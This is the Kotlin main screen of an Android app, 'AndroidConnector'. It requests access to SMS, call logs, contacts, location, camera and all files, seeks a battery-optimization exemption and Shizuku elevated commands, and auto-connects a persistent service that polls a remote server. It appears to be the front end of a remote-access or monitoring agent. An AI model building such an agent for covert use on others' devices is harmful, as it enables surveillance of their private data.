package com.kztutorial99.androidconnector

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.text.method.ScrollingMovementMethod
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kztutorial99.androidconnector.databinding.ActivityMainBinding
import rikka.shizuku.Shizuku
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
    private val logBuilder = StringBuilder()
    private val MAX_LOG = 150

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
    )

    private val shizukuPermissionListener = Shizuku.OnRequestPermissionResultListener { _, result ->
        if (result == PackageManager.PERMISSION_GRANTED) {
            appendLog("✅ Shizuku: permission granted")
        } else {
            appendLog("⚠️ Shizuku: permission denied")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.tvLog.movementMethod = ScrollingMovementMethod()
        binding.tvVersion.text = "v${packageManager.getPackageInfo(packageName, 0).versionName}"

        val deviceId = ensureDeviceId()
        binding.tvDeviceId.text = deviceId
        binding.tvServerUrl.text = ConnectorService.SERVER_URL.removePrefix("https://")

        setupButtons()
        requestAllPermissions()
        requestBatteryOptimization()

        Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)
        checkShizuku()
        requestStoragePermission()

        ConnectorService.statusCallback = { msg, running ->
            runOnUiThread {
                appendLog(msg)
                updateServiceState(running)
            }
        }

        appendLog("AndroidConnector started")
        appendLog("Device: ${Build.MANUFACTURER} ${Build.MODEL}")
        appendLog("Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        appendLog("Device ID: $deviceId")
        appendLog("")

        if (!ConnectorService.isRunning) {
            appendLog("→ Auto-connecting to server…")
            startConnectorService()
        } else {
            updateServiceState(true)
            appendLog("→ Service already running")
        }

        WatchdogReceiver.schedule(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        Shizuku.removeRequestPermissionResultListener(shizukuPermissionListener)
        ConnectorService.statusCallback = null
    }

    private fun ensureDeviceId(): String {
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun setupButtons() {
        binding.btnConnect.setOnClickListener {
            startConnectorService()
            appendLog("🔄 Connecting…")
        }

        binding.btnDisconnect.setOnClickListener {
            stopService(Intent(this, ConnectorService::class.java))
            WatchdogReceiver.cancel(this)
            updateServiceState(false)
            appendLog("🔴 Disconnected")
        }

        binding.btnClearLog.setOnClickListener {
            logBuilder.clear()
            binding.tvLog.text = ""
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        updateServiceState(true)
    }

    private fun updateServiceState(running: Boolean) {
        binding.btnConnect.isEnabled = !running
        binding.btnDisconnect.isEnabled = running
        binding.tvStatus.text = if (running) "Connected" else "Disconnected"
        binding.tvStatus.setTextColor(
            if (running) getColor(R.color.green) else getColor(R.color.red)
        )
        binding.statusDot.background =
            if (running) getDrawable(R.drawable.dot_green) else getDrawable(R.drawable.dot_red)
        binding.tvLastPoll.text =
            if (running) "Polling ${ConnectorService.SERVER_URL.removePrefix("https://")}" else "Tap CONNECT to start"
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                    appendLog("⚡ Requesting battery optimization exemption…")
                } catch (e: Exception) {
                    appendLog("⚠️ Could not request battery optimization: ${e.message}")
                }
            } else {
                appendLog("✅ Battery optimization: exempt")
            }
        }
    }

    private fun requestAllPermissions() {
        val missing = RUNTIME_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, 2001)
        }
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
        }
    }

    private fun checkShizuku() {
        try {
            val available = Shizuku.pingBinder()
            val granted = available && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
            when {
                granted -> appendLog("✅ Shizuku: active (elevated commands enabled)")
                available -> {
                    appendLog("⚠️ Shizuku running — tap status to grant permission")
                    binding.cardStatus.setOnClickListener {
                        try { Shizuku.requestPermission(1001) } catch (_: Exception) {}
                    }
                }
                else -> appendLog("ℹ️ Shizuku not running (optional)")
            }
        } catch (_: Exception) {}
    }

    override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(code, perms, results)
        if (code == 2001) {
            val granted = results.count { it == PackageManager.PERMISSION_GRANTED }
            appendLog("✅ Permissions: $granted/${results.size} granted")
        }
        if (code == 1001) {
            shizukuPermissionListener.onRequestPermissionResult(code,
                if (results.isNotEmpty()) results[0] else PackageManager.PERMISSION_DENIED)
        }
    }

    private fun appendLog(msg: String) {
        val lines = logBuilder.lines()
        if (lines.size > MAX_LOG) {
            logBuilder.clear()
            logBuilder.append(lines.takeLast(MAX_LOG).joinToString("\n"))
            logBuilder.append("\n")
        }
        logBuilder.appendLine(msg)
        binding.tvLog.text = logBuilder.toString()
        val scroll = binding.tvLog.layout?.let {
            it.getLineTop(binding.tvLog.lineCount) - binding.tvLog.height
        } ?: 0
        if (scroll > 0) binding.tvLog.scrollTo(0, scroll)
    }
}
